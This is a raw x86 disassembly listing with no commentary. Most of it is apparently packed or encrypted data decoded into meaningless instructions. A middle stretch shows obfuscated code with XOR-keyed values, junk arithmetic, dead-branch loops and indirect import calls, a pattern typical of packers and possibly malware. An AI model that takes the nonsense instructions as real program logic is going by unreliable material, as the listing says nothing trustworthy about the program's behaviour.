  415cab:	inc    ecx
  415cac:	mov    ebp,0x632cc008
  415cb1:	adc    BYTE PTR [edx],cl
  415cb3:	jno    0x415ce5
  415cb5:	outs   dx,DWORD PTR ds:[esi]
  415cb6:	mov    cl,0xe4
  415cb8:	aad    0xa8
  415cba:	dec    esp
  415cbb:	jno    0x415d27
  415cbd:	or     eax,0xa850c269
  415cc2:	call   DWORD PTR [ebp+0x73]
  415cc5:	mov    ah,0x4
  415cc7:	sar    BYTE PTR [ebx],cl
  415cc9:	or     DWORD PTR [edx-0x7387b71c],eax
  415ccf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cd0:	(bad)  
  415cd1:	or     al,0x4b
  415cd3:	cwde   
  415cd4:	test   eax,esi
  415cd6:	lods   eax,DWORD PTR ds:[esi]
  415cd7:	mov    ds:0x6780601a,al
  415cdc:	mov    bh,0x80
  415cde:	and    al,0x6
  415ce0:	cdq    
  415ce1:	in     eax,0xb1
  415ce3:	inc    edx
  415ce4:	lock cmp eax,edx
  415ce7:	iret   
  415ce8:	iret   
  415ce9:	shl    DWORD PTR [eax+0x5e],0x40
  415ced:	in     al,dx
  415cee:	or     eax,0x867d5997
  415cf3:	xor    eax,esi
  415cf5:	sti    
  415cf6:	or     eax,0xd0581ba3
  415cfb:	into   
  415cfc:	or     eax,DWORD PTR [ebp+ebp*8+0x6]
  415d00:	jnp    0x415cc7
  415d02:	add    BYTE PTR [edi],dh
  415d04:	push   0x1d5bfec3
  415d09:	std    
  415d0a:	iret   
  415d0b:	pop    edi
  415d0c:	push   cs
  415d0d:	test   eax,0x7e65b2e9
  415d12:	lods   eax,DWORD PTR ds:[esi]
  415d13:	and    bl,bl
  415d15:	push   edi
  415d16:	sbb    al,bl
  415d18:	test   eax,0x1e8c3ae1
  415d1d:	lods   al,BYTE PTR ds:[esi]
  415d1e:	ror    DWORD PTR [edi],1
  415d20:	jg     0x415d16
  415d22:	icebp  
  415d23:	clc    
  415d24:	sahf   
  415d25:	xor    eax,0x5a6b37a9
  415d2a:	push   esp
  415d2b:	mov    eax,0x15e1db79
  415d30:	sub    DWORD PTR [ebp+0x3581b7f5],ebp
  415d36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d37:	daa    
  415d38:	or     ah,BYTE PTR [edx+ebx*8-0x7e]
  415d3c:	jle    0x415dbd
  415d3e:	push   edx
  415d3f:	add    al,0xd7
  415d41:	push   cs
  415d42:	ret    0x152a
  415d45:	xor    BYTE PTR [edi+eax*8+0x9],bl
  415d49:	or     bh,BYTE PTR [ecx-0x49bce110]
  415d4f:	pop    edi
  415d50:	xchg   edx,eax
  415d51:	xchg   BYTE PTR [edi-0x27],ah
  415d54:	xor    DWORD PTR [ecx],eax
  415d56:	fndisi(8087 only) 
  415d58:	add    al,0x25
  415d5a:	ja     0x415d4b
  415d5c:	xor    al,0x5e
  415d5e:	imul   ecx,DWORD PTR [ecx],0x3673212a
  415d64:	repnz and BYTE PTR [eax],dl
  415d67:	ror    bl,0x42
  415d6a:	into   
  415d6b:	out    0x8,eax
  415d6d:	cmp    al,BYTE PTR [edi+0x53]
  415d70:	mov    edi,eax
  415d72:	mov    cl,0x85
  415d74:	dec    ecx
  415d75:	push   cs
  415d76:	adc    DWORD PTR [esi],edx
  415d78:	sbb    DWORD PTR [eax+ecx*8-0x194f7298],esi
  415d7f:	sti    
  415d80:	or     dh,bl
  415d82:	pop    ss
  415d83:	cs cld 
  415d85:	(bad)  
  415d86:	cmp    ah,dh
  415d88:	out    0x82,al
  415d8a:	pop    ss
  415d8b:	test   BYTE PTR [ebx],al
  415d8d:	aas    
  415d8e:	stos   DWORD PTR es:[edi],eax
  415d8f:	dec    ecx
  415d90:	addr16 es push ds
  415d93:	mov    es,WORD PTR [edx+0x470377d0]
  415d99:	sub    BYTE PTR [ebp+0x47],ch
  415d9c:	adc    eax,0xf635faac
  415da1:	jo     0x415dc2
  415da3:	ss stos DWORD PTR es:[edi],eax
  415da5:	stos   BYTE PTR es:[edi],al
  415da6:	icebp  
  415da7:	cmp    al,BYTE PTR [ebx+ecx*1-0x3b]
  415dab:	daa    
  415dac:	popf   
  415dad:	fs dec ebx
  415daf:	add    BYTE PTR [ebp+0x6dc1e217],bl
  415db5:	int    0x1d
  415db7:	daa    
  415db8:	test   DWORD PTR [edi+0x15],0x5c6a471e
  415dbf:	push   ss
  415dc0:	cmp    ah,dl
  415dc2:	pop    ecx
  415dc3:	dec    ecx
  415dc4:	jne    0x415d67
  415dc6:	sbb    dl,BYTE PTR [edi+0x2d]
  415dc9:	retf   0xb523
  415dcc:	cmp    bh,BYTE PTR [edi]
  415dce:	xor    DWORD PTR [ecx-0x7b],0x879ba3f7
  415dd5:	gs (bad) 
  415dd7:	shr    DWORD PTR [ebx],cl
  415dd9:	fsubrp st(0),st
  415ddb:	xor    DWORD PTR [ecx],edx
  415ddd:	iret   
  415dde:	lods   eax,DWORD PTR ds:[esi]
  415ddf:	and    bl,dh
  415de1:	xchg   ebx,eax
  415de2:	mov    al,ds:0xb42f3188
  415de7:	jno    0x415e17
  415de9:	test   eax,0xd72edf59
  415dee:	xor    eax,0x2d1a5c82
  415df3:	pop    DWORD PTR [ebp+0x70]
  415df6:	adc    eax,0x45c9599d
  415dfb:	ja     0x415df3
  415dfd:	ret    0xd2b4
  415e00:	pop    esi
  415e01:	stos   DWORD PTR es:[edi],eax
  415e02:	push   esp
  415e03:	push   edx
  415e04:	mov    ecx,0x4a529cb
  415e09:	mov    ch,0xb4
  415e0b:	pop    ebx
  415e0c:	inc    ecx
  415e0d:	in     al,0x6d
  415e0f:	xchg   edi,eax
  415e10:	xor    eax,0x99d98989
  415e15:	mov    ebx,0xe3bacffa
  415e1a:	inc    ecx
  415e1b:	jecxz  0x415dfd
  415e1d:	fdivr  DWORD PTR [eax+0x27]
  415e20:	pop    ebx
  415e21:	and    al,0xf5
  415e23:	mov    eax,0xbcf9e6b2
  415e28:	inc    BYTE PTR [eax+0x7fdd8e25]
  415e2e:	or     DWORD PTR [ebp+0x168b856e],ebp
  415e34:	mov    esi,ebp
  415e36:	(bad)  
  415e37:	jne    0x415e2d
  415e39:	dec    eax
  415e3a:	cmp    ah,BYTE PTR [ebx-0x4e4f383d]
  415e40:	mov    bh,0x22
  415e42:	test   esi,edx
  415e44:	pop    esi
  415e45:	rcr    BYTE PTR [esi+0x2764adab],cl
  415e4b:	push   eax
  415e4c:	cmp    ecx,edx
  415e4e:	loope  0x415e04
  415e50:	stos   DWORD PTR es:[edi],eax
  415e51:	sti    
  415e52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e53:	xor    BYTE PTR [edi-0x117cac15],0x3f
  415e5a:	and    dh,ah
  415e5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e5d:	xchg   ebx,eax
  415e5e:	cmp    ebx,DWORD PTR [eax-0x24]
  415e61:	sbb    BYTE PTR [ecx-0x2ee03109],al
  415e67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e68:	test   eax,0x126f9e63
  415e6d:	jmp    0x1cbc6b30
  415e72:	xchg   edx,eax
  415e73:	sub    BYTE PTR [ebx-0xb],dl
  415e76:	dec    eax
  415e77:	mov    ebp,0x17ae6d9a
  415e7c:	pop    ecx
  415e7d:	jnp    0x415e83
  415e7f:	fld1   
  415e81:	pop    ds
  415e82:	inc    eax
  415e83:	inc    esp
  415e84:	in     al,dx
  415e85:	les    edx,FWORD PTR fs:[ebx+edx*2+0x75e290ea]
  415e8d:	cli    
  415e8e:	loope  0x415ed0
  415e90:	clc    
  415e91:	mov    esi,0x5d689567
  415e96:	repz into 
  415e98:	outs   dx,BYTE PTR ds:[esi]
  415e99:	daa    
  415e9a:	rol    edx,0xd3
  415e9d:	pop    ebp
  415e9e:	bnd jnp 0x415ead
  415ea1:	sub    edi,DWORD PTR gs:[eax+edx*4-0x5f]
  415ea6:	test   BYTE PTR [ecx-0x72],bl
  415ea9:	sbb    al,bh
  415eab:	bound  ebx,QWORD PTR [edx-0x32ffb88e]
  415eb1:	and    BYTE PTR [edx],bl
  415eb3:	adc    eax,0xbcfdedc6
  415eb8:	loop   0x415e67
  415eba:	sar    BYTE PTR [esi-0x56],0x8f
  415ebe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ebf:	xchg   edx,eax
  415ec0:	jno    0x415e4f
  415ec2:	cs test ebx,edi
  415ec5:	cmc    
  415ec6:	mov    edi,DWORD PTR [ecx+0x3]
  415ec9:	mov    ah,0xb
  415ecb:	xor    eax,DWORD PTR [ebx]
  415ecd:	cmp    DWORD PTR [ebx+0x6bccbf41],eax
  415ed3:	(bad)  
  415ed5:	mov    eax,0x353b645d
  415eda:	rol    DWORD PTR [esi+0x32],1
  415edd:	and    eax,0x26e527c4
  415ee2:	cmc    
  415ee3:	in     al,0x37
  415ee5:	jl     0x415f20
  415ee7:	pushf  
  415ee8:	out    dx,eax
  415ee9:	dec    eax
  415eea:	pop    ebx
  415eeb:	push   ecx
  415eec:	ds hlt 
  415eee:	retf   
  415eef:	sbb    BYTE PTR [eax-0x13a8596e],dh
  415ef5:	xchg   esi,eax
  415ef6:	sub    dh,BYTE PTR [eax+0x6305ffd0]
  415efc:	mov    ds:0xf21a567,eax
  415f01:	hlt    
  415f02:	pop    ebp
  415f03:	out    dx,al
  415f04:	sbb    esp,eax
  415f06:	mov    edx,0xd988c2dc
  415f0b:	mov    eax,ds:0x8b498ce1
  415f10:	stc    
  415f11:	jns    0x415ee6
  415f13:	mov    esp,0x571af708
  415f18:	push   0xaed93543
  415f1d:	lods   eax,DWORD PTR ds:[esi]
  415f1e:	pushf  
  415f1f:	dec    ecx
  415f20:	std    
  415f21:	shl    DWORD PTR [esp+edi*8],cl
  415f24:	retf   0xfb6b
  415f27:	not    bl
  415f29:	scas   al,BYTE PTR es:[edi]
  415f2a:	sub    DWORD PTR [ebp+0x63],edi
  415f2d:	push   edi
  415f2e:	loopne 0x415ebf
  415f30:	ja     0x415f32
  415f32:	mov    dl,0xb1
  415f34:	mov    ch,dh
  415f36:	ins    BYTE PTR es:[edi],dx
  415f37:	xchg   ebx,eax
  415f38:	aad    0x82
  415f3a:	je     0x415efc
  415f3c:	jge    0x415f1d
  415f3e:	js     0x415f40
  415f40:	inc    ch
  415f42:	fcomp  QWORD PTR [ecx+ebp*2+0x6a]
  415f46:	jb     0x415f78
  415f48:	and    ah,cl
  415f4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f4b:	adc    BYTE PTR [edx],al
  415f4d:	dec    ecx
  415f4e:	loop   0x415f0a
  415f50:	mov    bh,0xd4
  415f52:	ins    BYTE PTR es:[edi],dx
  415f53:	pop    edx
  415f54:	pop    ebp
  415f55:	push   edx
  415f56:	js     0x415fbf
  415f58:	iret   
  415f59:	out    0xc,al
  415f5b:	adc    al,0xb0
  415f5d:	out    dx,al
  415f5e:	jns    0x415eea
  415f60:	or     edx,DWORD PTR [edi+0x668729ab]
  415f66:	aad    0x95
  415f68:	adc    esp,DWORD PTR [edx-0xe]
  415f6b:	dec    ecx
  415f6c:	push   esp
  415f6d:	xlat   BYTE PTR ds:[ebx]
  415f6e:	das    
  415f6f:	ret    0xb000
  415f72:	jle    0x415f76
  415f74:	nop
  415f75:	adc    al,0xec
  415f77:	pop    edi
  415f78:	fadd   QWORD PTR [esi]
  415f7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f7b:	xchg   edi,eax
  415f7c:	jp     0x415ff2
  415f7e:	mov    ebp,0x41a3d29b
  415f83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f84:	ds fsubp st(6),st
  415f87:	scas   al,BYTE PTR es:[edi]
  415f88:	inc    esi
  415f89:	out    dx,eax
  415f8a:	push   ds
  415f8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f8c:	sbb    al,0x3a
  415f8e:	retf   0x3190
  415f91:	fild   DWORD PTR [ecx+0x6ffa323a]
  415f97:	mov    bl,0xb4
  415f99:	add    al,0xa6
  415f9b:	or     dl,ch
  415f9d:	and    DWORD PTR [eax-0x5b],esp
  415fa0:	cs aaa 
  415fa2:	rol    edx,0xbd
  415fa5:	add    cl,BYTE PTR [esi+0x661487dd]
  415fab:	jnp    0x416013
  415fad:	out    0x3d,eax
  415faf:	xor    bl,dh
  415fb1:	push   ss
  415fb2:	cmp    al,0xa8
  415fb4:	sbb    eax,0xe45663ea
  415fb9:	xor    al,0xd3
  415fbb:	fdivr  st,st(5)
  415fbd:	jne    0x415ff8
  415fbf:	pop    esi
  415fc0:	pop    esi
  415fc1:	jae    0x415fbf
  415fc3:	lods   eax,DWORD PTR ds:[esi]
  415fc4:	mov    WORD PTR [ecx+0x40],fs
  415fc7:	pop    esp
  415fc8:	popa   
  415fc9:	data16 sahf 
  415fcb:	loop   0x415fff
  415fcd:	sub    esi,edi
  415fcf:	lods   eax,DWORD PTR ds:[esi]
  415fd0:	iret   
  415fd1:	jp     0x416016
  415fd3:	fnsave [ebx]
  415fd5:	xchg   ecx,eax
  415fd6:	data16 aad 0xe2
  415fd9:	and    al,0xae
  415fdb:	lods   eax,DWORD PTR ds:[esi]
  415fdc:	sbb    eax,0x197b9386
  415fe1:	sar    DWORD PTR [edi-0x77eabca],cl
  415fe7:	pop    edi
  415fe8:	lock fcomp QWORD PTR [ebp-0x4e]
  415fec:	and    BYTE PTR [ecx+esi*8+0x7d],ah
  415ff0:	inc    edi
  415ff1:	sbb    ebx,edx
  415ff3:	test   ebx,edi
  415ff5:	popa   
  415ff6:	popa   
  415ff7:	out    0xf7,al
  415ff9:	cmp    edi,DWORD PTR ds:0x91eacf1b
  415fff:	cmp    ch,ch
  416001:	pop    eax
  416002:	hlt    
  416003:	mov    esi,0x4f701f4c
  416008:	aad    0xc5
  41600a:	out    dx,eax
  41600b:	mov    eax,0x538f8785
  416010:	cmp    bl,bh
  416012:	inc    ecx
  416013:	(bad)  
  416014:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416015:	hlt    
  416016:	mov    al,ds:0x81d03376
  41601b:	sub    eax,0x431014
  416020:	add    al,0xe0
  416022:	inc    edx
  416023:	add    BYTE PTR [ebx],dh
  416025:	fsubr  DWORD PTR [ebx]
  416027:	rcr    DWORD PTR [ecx],cl
  416029:	cmp    eax,0x432018
  41602e:	sub    edx,esi
  416030:	xor    edx,eax
  416032:	mov    DWORD PTR [ebp+0x8],edx
  416035:	mov    edx,DWORD PTR [ebp+0x8]
  416038:	mov    ebx,DWORD PTR [ebp-0x58]
  41603b:	add    edx,0x5708c0
  416041:	sub    DWORD PTR ds:0x432008,0x431010
  41604b:	imul   edx,ebx
  41604e:	add    DWORD PTR ds:0x431004,edi
  416054:	mov    DWORD PTR [ebp-0x58],edx
  416057:	add    ebx,DWORD PTR ds:0x431018
  41605d:	mov    edx,DWORD PTR [ebp+0x8]
  416060:	mov    ebx,DWORD PTR [ebp-0x54]
  416063:	and    DWORD PTR ds:0x42e028,0x430008
  41606d:	add    edx,0x64f8a2
  416073:	add    DWORD PTR ds:0x42e010,0x125e
  41607d:	or     edx,ebx
  41607f:	mov    DWORD PTR [ebp-0x54],edx
  416082:	adc    ebx,edx
  416084:	mov    edx,DWORD PTR [ebp+0x8]
  416087:	sub    DWORD PTR ds:0x42e018,ecx
  41608d:	mov    ebx,DWORD PTR [ebp-0x50]
  416090:	inc    DWORD PTR ds:0x42e010
  416096:	add    edx,ecx
  416098:	xor    edx,ebx
  41609a:	adc    DWORD PTR ds:0x430010,edx
  4160a0:	mov    DWORD PTR [ebp-0x50],edx
  4160a3:	mov    edx,DWORD PTR [ebp+0x8]
  4160a6:	add    ebx,0x699b
  4160ac:	mov    ebx,DWORD PTR [ebp-0x4c]
  4160af:	sub    DWORD PTR ds:0x431000,0x2b77
  4160b9:	add    edx,edi
  4160bb:	or     DWORD PTR ds:0x430004,0x35b8
  4160c5:	and    edx,ebx
  4160c7:	and    DWORD PTR ds:0x430000,0x0
  4160d1:	jmp    0x4160e3
  4160d6:	mov    ebx,DWORD PTR ds:0x430000
  4160dc:	inc    ebx
  4160dd:	mov    DWORD PTR ds:0x430000,ebx
  4160e3:	cmp    DWORD PTR ds:0x430000,0x1f
  4160ea:	jae    0x416134
  4160f0:	cmp    DWORD PTR ds:0x430000,0xd
  4160f7:	jl     0x416134
  4160fd:	jmp    0x416115
  416102:	push   DWORD PTR [ebp-0x1c]
  416105:	push   0x6567
  41610a:	push   0x7580
  41610f:	call   DWORD PTR ds:0x4348bb
  416115:	cmp    DWORD PTR ds:0x430000,0xc
  41611c:	jne    0x41612f
  416122:	mov    ebx,DWORD PTR ds:0x430000
  416128:	inc    ebx
  416129:	mov    DWORD PTR ds:0x430000,ebx
  41612f:	jmp    0x4160d6
  416134:	mov    DWORD PTR [ebp-0x4c],edx
  416137:	and    DWORD PTR ds:0x42e018,0x0
  416141:	mov    edx,DWORD PTR ds:0x42e018
  416147:	inc    edx
  416148:	mov    DWORD PTR ds:0x42e018,edx
  41614e:	cmp    DWORD PTR ds:0x42e018,0x7
  416155:	jb     0x4161aa
  41615b:	jmp    0x416183
  416160:	push   0x430018
  416165:	push   0x8477
  41616a:	push   0x38e9
  41616f:	push   DWORD PTR [ebp-0x20]
  416172:	push   DWORD PTR [ebp-0x24]
  416175:	push   0x5246
  41617a:	push   DWORD PTR [ebp-0x1c]
  41617d:	call   DWORD PTR ds:0x4348e7
  416183:	cmp    DWORD PTR ds:0x42e018,0x6
  41618a:	jne    0x41619d
  416190:	mov    edx,DWORD PTR ds:0x42e018
  416196:	inc    edx
  416197:	mov    DWORD PTR ds:0x42e018,edx
  41619d:	cmp    DWORD PTR ds:0x42e018,0x1f
  4161a4:	jb     0x416141
  4161aa:	mov    edx,DWORD PTR [ebp+0x8]
  4161ad:	mov    ebx,DWORD PTR [ebp-0x48]
  4161b0:	lea    edx,[ebx+edx*1+0x241fc1f]
  4161b7:	mov    DWORD PTR [ebp-0x48],edx
  4161ba:	mov    edx,DWORD PTR [ebp+0x8]
  4161bd:	mov    ebx,0xfa5e15e2
  4161c2:	sub    ebx,edx
  4161c4:	add    ebx,DWORD PTR [ebp-0x44]
  4161c7:	mov    DWORD PTR [ebp-0x44],ebx
  4161ca:	mov    edx,DWORD PTR [ebp+0x8]
  4161cd:	xor    edx,eax
  4161cf:	add    edx,esi
  4161d1:	jne    0x413bf2
  4161d7:	mov    edx,DWORD PTR [ebp-0xc]
  4161da:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4161e1:	mov    bl,BYTE PTR [ebp-0x1]
  4161e4:	cmp    dl,bl
  4161e6:	je     0x4162c4
  4161ec:	mov    ecx,DWORD PTR [ebp-0x5c]
  4161ef:	mov    edx,DWORD PTR [ebp-0xc]
  4161f2:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4161f9:	mov    ebx,DWORD PTR [ebp+0xc]
  4161fc:	xor    ecx,eax
  4161fe:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272e4]
  416205:	jne    0x41ab6e
  41620b:	mov    ecx,DWORD PTR [ebp-0x5c]
  41620e:	mov    edx,DWORD PTR [ebp+0xc]
  416211:	xor    ecx,eax
  416213:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272e4]
  41621b:	mov    edx,DWORD PTR [ebp-0x18]
  41621e:	xor    edx,eax
  416220:	add    edx,esi
  416222:	cmp    ecx,edx
  416224:	mov    ecx,DWORD PTR [ebp-0x14]
  416227:	mov    DWORD PTR [ebp+0x8],ecx
  41622a:	mov    ecx,DWORD PTR [ebp+0x8]
  41622d:	je     0x41d031
  416233:	xor    ecx,eax
  416235:	add    ecx,esi
  416237:	mov    ecx,0x242ebed
  41623c:	je     0x41aac2
  416242:	mov    edx,DWORD PTR [ebp+0x8]
  416245:	mov    ebx,DWORD PTR [ebp-0x8]
  416248:	xor    edx,eax
  41624a:	xor    ebx,eax
  41624c:	sub    edx,ebx
  41624e:	sub    edx,esi
  416250:	xor    edx,eax
  416252:	mov    DWORD PTR [ebp+0x8],edx
  416255:	mov    edx,DWORD PTR [ebp+0x8]
  416258:	mov    ebx,DWORD PTR [ebp-0x58]
  41625b:	add    edx,0x5708c0
  416261:	imul   edx,ebx
  416264:	mov    DWORD PTR [ebp-0x58],edx
  416267:	mov    edx,DWORD PTR [ebp+0x8]
  41626a:	mov    ebx,DWORD PTR [ebp-0x54]
  41626d:	add    edx,0x64f8a2
  416273:	or     edx,ebx
  416275:	mov    DWORD PTR [ebp-0x54],edx
  416278:	mov    edx,DWORD PTR [ebp+0x8]
  41627b:	mov    ebx,DWORD PTR [ebp-0x50]
  41627e:	add    edx,ecx
  416280:	xor    edx,ebx
  416282:	mov    DWORD PTR [ebp-0x50],edx
  416285:	mov    edx,DWORD PTR [ebp+0x8]
  416288:	mov    ebx,DWORD PTR [ebp-0x4c]
  41628b:	add    edx,edi
  41628d:	and    edx,ebx
  41628f:	mov    DWORD PTR [ebp-0x4c],edx
  416292:	mov    edx,DWORD PTR [ebp+0x8]
  416295:	mov    ebx,DWORD PTR [ebp-0x48]
  416298:	lea    edx,[ebx+edx*1+0x241fc1f]
  41629f:	mov    DWORD PTR [ebp-0x48],edx
  4162a2:	mov    edx,DWORD PTR [ebp+0x8]
  4162a5:	mov    ebx,0xfa5e15e2
  4162aa:	sub    ebx,edx
  4162ac:	add    ebx,DWORD PTR [ebp-0x44]
  4162af:	mov    DWORD PTR [ebp-0x44],ebx
  4162b2:	mov    edx,DWORD PTR [ebp+0x8]
  4162b5:	xor    edx,eax
  4162b7:	add    edx,esi
  4162b9:	jne    0x416242
  4162bf:	jmp    0x41aac2
  4162c4:	mov    edx,DWORD PTR [ebp-0x14]
  4162c7:	mov    DWORD PTR [ebp+0x8],edx
  4162ca:	jmp    0x41aab5
  4162cf:	mov    edx,DWORD PTR [ebp+0x8]
  4162d2:	mov    ebx,DWORD PTR [ebp-0x8]
  4162d5:	xor    edx,eax
  4162d7:	xor    ebx,eax
  4162d9:	sub    edx,ebx
  4162db:	sub    edx,esi
  4162dd:	jmp    0x418698
  4162e2:	inc    esi
  4162e3:	xor    ecx,DWORD PTR ds:0xc3900f94
  4162e9:	jae    0x4162ae
  4162eb:	mov    esi,0x81bc635a
  4162f0:	clc    
  4162f1:	stos   BYTE PTR es:[edi],al
  4162f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162f3:	push   edi
  4162f4:	jge    0x416368
  4162f6:	rcr    BYTE PTR [edi+0x72],1
  4162f9:	jb     0x4162ec
  4162fb:	fbld   TBYTE PTR [eax-0x3fd72a2c]
  416301:	(bad)  
  416302:	mov    bh,0xb9
  416304:	jecxz  0x4162ef
  416306:	push   cs
  416307:	(bad)  
  416308:	lds    ebp,FWORD PTR [ecx+0x172da377]
  41630e:	mov    WORD PTR [ebx+edx*8-0x63634be9],?
  416315:	or     DWORD PTR [eax+0x7bbc12f3],eax
  41631b:	data16 cmp BYTE PTR [eax],ah
  41631e:	les    esi,FWORD PTR [esi+0xb985fe4]
  416324:	out    dx,al
  416325:	ins    DWORD PTR es:[edi],dx
  416326:	pop    edx
  416327:	imul   ecx,DWORD PTR [ecx+0x6f],0x1b360d95
  41632e:	mov    ecx,0x970b2797
  416333:	dec    ecx
  416334:	xchg   ebp,eax
  416335:	sbb    esi,DWORD PTR [eax+ebp*8-0x5f]
  416339:	ja     0x41630b
  41633b:	dec    esi
  41633c:	pop    ss
  41633d:	xor    cl,BYTE PTR [esi-0x28]
  416340:	sub    al,0xf1
  416342:	adc    DWORD PTR [eax-0x31fb7d16],esp
  416348:	xchg   bl,al
  41634a:	inc    esi
  41634b:	clc    
  41634c:	sub    ch,BYTE PTR [edx]
  41634e:	dec    edi
  41634f:	mov    bh,0x49
  416351:	loope  0x416302
  416353:	shl    DWORD PTR [esi],0x3e
  416356:	jg     0x416390
  416358:	or     dh,BYTE PTR [edx+0x175d6542]
  41635e:	adc    ebx,0xffffff80
  416361:	fnsave [edi]
  416363:	adc    edi,DWORD PTR [eax]
  416365:	jmp    0x31ed:0xb9738bb2
  41636c:	mov    al,ds:0x1a71ceee
  416371:	fdivr  st,st(5)
  416373:	fisubr DWORD PTR [edi+0x2bd706cc]
  416379:	or     eax,0x29be600e
  41637e:	ins    BYTE PTR es:[edi],dx
  41637f:	add    eax,0xe5377cd9
  416384:	or     BYTE PTR [esi],ah
  416386:	lea    ebp,[ebp-0x1a]
  416389:	jg     0x41634c
  41638b:	in     al,0x33
  41638d:	xlat   BYTE PTR ds:[ebx]
  41638e:	cmc    
  41638f:	loopne 0x41637b
  416391:	mov    ah,0x23
  416393:	push   edi
  416394:	test   eax,0x61a68095
  416399:	fmul   DWORD PTR [esi+0x5c]
  41639c:	add    BYTE PTR [ecx-0x30ed8b15],ch
  4163a2:	sub    dh,BYTE PTR ds:0xaec4f17b
  4163a8:	pop    ebp
  4163a9:	add    BYTE PTR ds:0xb4a1bb48,bh
  4163af:	sbb    BYTE PTR [ebx+0xc7c3cbf],bh
  4163b5:	shl    dl,0x26
  4163b8:	pop    ss
  4163b9:	pop    esp
  4163ba:	jmp    0x8ca544e4
  4163bf:	pop    ss
  4163c0:	call   0xd64b4ea8
  4163c5:	and    ah,dl
  4163c7:	inc    esi
  4163c8:	mov    ds:0x29403877,eax
  4163cd:	popa   
  4163ce:	inc    edi
  4163cf:	add    dh,BYTE PTR [eax+0x2e98151e]
  4163d5:	in     eax,dx
  4163d6:	or     al,al
  4163d8:	or     DWORD PTR [ebx+0x46],edx
  4163db:	jae    0x4163b5
  4163dd:	or     al,0x90
  4163df:	loopne 0x4163e3
  4163e1:	jmp    0x4163a6
  4163e3:	js     0x4163c7
  4163e5:	mov    ?,WORD PTR [esi+0x2447c83]
  4163eb:	and    BYTE PTR [ebx+ebx*4+0x62],dl
  4163ef:	add    eax,0x5a907f42
  4163f4:	or     BYTE PTR ds:0x94061166,bl
  4163fa:	cmp    DWORD PTR [eax-0x46ea6a3c],0xf8ae3465
  416404:	jp     0x41642c
  416406:	mov    bh,0x5a
  416408:	dec    edx
  416409:	sahf   
  41640a:	pusha  
  41640b:	(bad)  [ecx+0x6b]
  41640e:	push   ds
  41640f:	pop    es
  416410:	mov    ds:0x8bf4a77,al
  416415:	cld    
  416416:	sub    esp,esp
  416418:	mov    ch,0x6c
  41641a:	mov    ds:0xb5c9cbfa,al
  41641f:	xchg   DWORD PTR fs:0xa686df70,ebx
  416426:	xor    eax,0x4a9e12b8
  41642b:	mov    ds:0x64dfbb8a,al
  416430:	retf   0xab68
  416433:	dec    ebx
  416434:	repnz mov edi,0x41785521
  41643a:	xor    DWORD PTR [esi],ecx
  41643c:	lods   eax,DWORD PTR ds:[esi]
  41643d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41643e:	out    0xd3,al
  416440:	push   ebx
  416441:	shl    DWORD PTR [edi],1
  416443:	inc    ecx
  416444:	jb     0x41643f
  416446:	xchg   esp,eax
  416447:	xlat   BYTE PTR ds:[ebx]
  416448:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416449:	xchg   ebp,eax
  41644a:	js     0x4164b7
  41644c:	sub    eax,0x4a5ee007
  416451:	into   
  416452:	jne    0x416465
  416454:	ss inc esp
  416456:	outs   dx,BYTE PTR ds:[esi]
  416457:	sub    eax,0x66e94e22
  41645c:	mov    ?,edx
  41645e:	and    esi,DWORD PTR [edi-0x41a1544e]
  416464:	rcl    edi,0xd7
  416467:	sahf   
  416468:	popa   
  416469:	xchg   edx,eax
  41646a:	(bad)  
  41646b:	lahf   
  41646c:	mov    dh,0xc
  41646e:	divps  xmm0,XMMWORD PTR [eax+edi*2-0x44]
  416473:	je     0x4164e5
  416475:	inc    eax
  416476:	cmp    ecx,DWORD PTR [edi-0x64]
  416479:	arpl   WORD PTR [eax],ax
  41647b:	push   eax
  41647c:	sahf   
  41647d:	pop    esi
  41647e:	addr16 or eax,0x9fc8ea3c
  416484:	ss inc esp
  416486:	adc    eax,0xe04c849e
  41648b:	loopne 0x41641f
  41648d:	lea    edx,[ebp+0x74]
  416490:	inc    eax
  416491:	mov    edx,0xca55c0e1
  416496:	pop    ds
  416497:	mov    ah,0xae
  416499:	sbb    BYTE PTR [ebx-0x63ecd247],ch
  41649f:	jno    0x416515
  4164a1:	adc    ecx,esp
  4164a3:	inc    esp
  4164a4:	or     dh,BYTE PTR [eax-0x27ce2e64]
  4164aa:	retf   0x2425
  4164ad:	xlat   BYTE PTR ds:[ebx]
  4164ae:	hlt    
  4164af:	push   DWORD PTR [ecx+0x32a9b486]
  4164b5:	aad    0x63
  4164b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164b8:	lds    ecx,FWORD PTR [ecx-0x30]
  4164bb:	mov    al,0xe1
  4164bd:	add    dh,dh
  4164bf:	arpl   WORD PTR [ebp-0x37],ax
  4164c2:	jl     0x4164ea
  4164c4:	inc    eax
  4164c5:	fstp   DWORD PTR [eax]
  4164c7:	mov    eax,ds:0x6a7830de
  4164cc:	ins    DWORD PTR es:[edi],dx
  4164cd:	mov    ch,0xcf
  4164cf:	xchg   DWORD PTR [ebx],esp
  4164d1:	popf   
  4164d2:	mov    esp,0xbfde6c4f
  4164d7:	mov    bl,0xd9
  4164d9:	jmp    0x9a5d:0x8ff8ab3b
  4164e0:	sub    ebx,DWORD PTR [eax]
  4164e2:	repz push edi
  4164e4:	mov    ah,0x7b
  4164e6:	cmp    eax,0x807775e1
  4164eb:	xor    ah,bl
  4164ed:	bound  ebp,QWORD PTR [esi-0x72484200]
  4164f3:	push   ebp
  4164f4:	(bad)  
  4164f5:	add    bl,cl
